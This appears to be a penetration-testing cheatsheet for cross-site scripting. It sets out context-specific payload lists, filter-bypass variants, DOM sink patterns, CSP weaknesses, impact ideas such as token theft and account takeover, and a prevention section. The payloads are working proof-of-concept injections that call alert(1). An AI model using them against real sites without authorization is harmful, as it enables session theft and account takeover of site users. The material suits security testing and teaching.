# XSS Cheatsheet

For authorized testing only. Identify the context first, then choose the smallest payload
that proves execution.

## 1. Context matters

| Context | Example | Starting point |
|---|---|---|
| HTML body | `<p>INPUT</p>` | `<script>alert(1)</script>` |
| Attribute | `<input value="INPUT">` | `" onfocus="alert(1)" autofocus="` |
| URL attribute | `<a href="INPUT">` | `javascript:alert(1)` |
| JavaScript string | `var x = "INPUT";` | `";alert(1);//` |
| Template literal | ``var x = `INPUT`;`` | ``${alert(1)}`` |
| CSS | `style="color: INPUT"` | `red;background:url(javascript:alert(1))` |

## 2. Basic proof payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
```

If parentheses or quotes are filtered:

```html
<img src=x onerror=alert`1`>
<img src=x onerror=eval(name)>
<svg onload=alert&lpar;1&rpar;>
```

## 3. Attribute breakout

```html
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

If the attribute is unquoted:

```html
x onmouseover=alert(1)
```

## 4. JavaScript string breakout

```js
";alert(1);//
';alert(1);//
</script><script>alert(1)</script>
```

Inside a template literal:

```js
${alert(1)}
```

## 5. DOM XSS sinks

Look for user input flowing into:

- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
- `document.write`, `document.writeln`
- `eval`, `Function`, `setTimeout(string)`, `setInterval(string)`
- `location`, `location.href`, `location.assign`, `location.replace`
- `element.setAttribute('href', ...)`, `src`, `srcdoc`
- jQuery: `.html()`, `.append()`, `.prepend()`, `$()` with HTML

Example source-to-sink chain:

```js
const name = new URLSearchParams(location.search).get('name');
document.getElementById('out').innerHTML = name;
```

Payload:

```text
?name=<img src=x onerror=alert(1)>
```

## 6. Filter bypass ideas

- alternate tags: `svg`, `math`, `details`, `video`, `audio`, `marquee`
- alternate events: `onload`, `onerror`, `onfocus`, `ontoggle`, `onanimationstart`
- case variation: `<ScRiPt>`
- whitespace: `<img/src=x/onerror=alert(1)>`
- encoding: HTML entities, URL encoding, Unicode escapes
- double encoding when the app decodes twice
- `javascript:` with tabs/newlines: `java\tscript:alert(1)`

Do not assume a payload works because it is not blocked. Verify execution in the browser.

## 7. CSP

Check the header:

```bash
curl -sI https://target | grep -i content-security-policy
```

Look for:

- `unsafe-inline` — inline scripts allowed
- `unsafe-eval` — `eval` allowed
- missing `object-src` / `base-uri`
- wildcard or CDN allowlists with JSONP endpoints
- `nonce` reuse or predictable nonces
- `script-src 'self'` with an upload or JSONP endpoint on the same origin

CSP is not a substitute for output encoding.

## 8. Impact

A simple `alert(1)` proves execution. To show impact, demonstrate one of:

- session/token theft (in a lab account)
- CSRF token read and a state-changing request
- account takeover chain
- sensitive data read from the DOM or an API
- admin action performed as the victim

Keep the proof minimal and redact real user data.

## 9. Prevention

- context-aware output encoding (HTML, attribute, JS, URL, CSS)
- sanitize rich HTML with a maintained library (DOMPurify)
- avoid dangerous sinks; use `textContent` and safe DOM APIs
- strict CSP with nonces or hashes
- `HttpOnly` and `SameSite` cookies
- Trusted Types where available
